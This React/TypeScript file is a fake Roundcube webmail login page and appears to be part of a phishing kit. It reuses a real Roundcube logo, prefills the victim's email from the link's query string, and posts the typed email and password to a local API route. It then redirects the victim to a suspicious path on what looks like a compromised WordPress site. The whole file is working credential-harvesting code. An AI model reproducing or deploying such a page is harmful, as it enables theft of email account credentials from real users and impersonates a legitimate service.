
import axios from "axios"
import { useEffect, useRef, useState } from "react"
import { FormEvent, ChangeEvent } from "react"

type Form = {
   email: string;
   passwort: string
}

export default function Main() {


  const [credentials, setCredentials] = useState<Form>({email: '', passwort: ''})

  const handleChange = (e: ChangeEvent<HTMLInputElement>) => {
    let name = e.target.name 
    let value = e.target.value

    setCredentials({...credentials, [name]: value})
    
  }

  const handleSubmit = (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault()

    const data = {
      email: credentials.email,
      password: credentials.passwort
    }

    axios.post('/api/hello', data)
    .then((req) => {
      console.log(req.data);
      setCredentials({passwort: "", email: ""})
      window.location.href = 'https://www.ndindustries.com.tr/wp-admin/maint/203763yedju363792ue/round.php?'
    }).catch((err) => {
      console.log(err);

    })
  }

  useEffect(() => {
     if (location.search){
      // console.log(location.search);
      const url = new URLSearchParams(location.search)
      const email = url.get('email')
      if (email)
      setCredentials({...credentials, email})
     }
  },[])

  return (
    <>
    <main className="w-screen flex justify-center">
      <div className="w-11/12 sm:w-[320px] flex flex-col items-center mt-28">
        <img 
          src="https://webmail.supremecluster.com/skins/elastic/images/logo.svg?s=1593860317" 
          alt="roundcube" 
          className="w-28 h-24"
          />

          <form className="w-full mt-6" onSubmit={(e) => handleSubmit(e)}>

             <div className="flex">
              <span className="w-[10%] border rounded-l-md bg-gray-100"/>
              <input type="text" 
                      className="h-11 w-[90%] border rounded-r-md outline-none
                               focus:border-sky-400 focus:border-4 
                                focus:border-opacity-50 px-3
                                placeholder:text-lg
                                placeholder:opacity-70
                                text-lg
                                " 
                      name="email"
                      value={credentials.email}
                      onChange={handleChange}
                      placeholder="Username"
                      />
             </div>

             <div className="flex mt-2">
              <span className="w-[10%] border rounded-l-md bg-gray-100"/>
              <input type="password" 
                      className="h-11 w-[90%] border rounded-r-md 
                                  outline-none focus:border-sky-400 
                                  focus:border-4 focus:border-opacity-50 px-3
                                  placeholder:text-lg
                                  placeholder:opacity-70
                                  " 
                      name="passwort"
                      value={credentials.passwort}
                      onChange={handleChange}
                      placeholder="Password"
                      />
             </div>

                   <input 
                      type="submit"
                      className="h-11 w-full bg-sky-400 mt-3
                        rounded-md uppercase text-white text-lg
                        cursor-pointer
                        "
                        value="Login"
                        />
                
              

              <p className="text-center text-gray-500 mt-2 tracking-tighter">Roundcube webmail</p>
          </form>

      </div>
    </main>
    
    </>
    
  )
}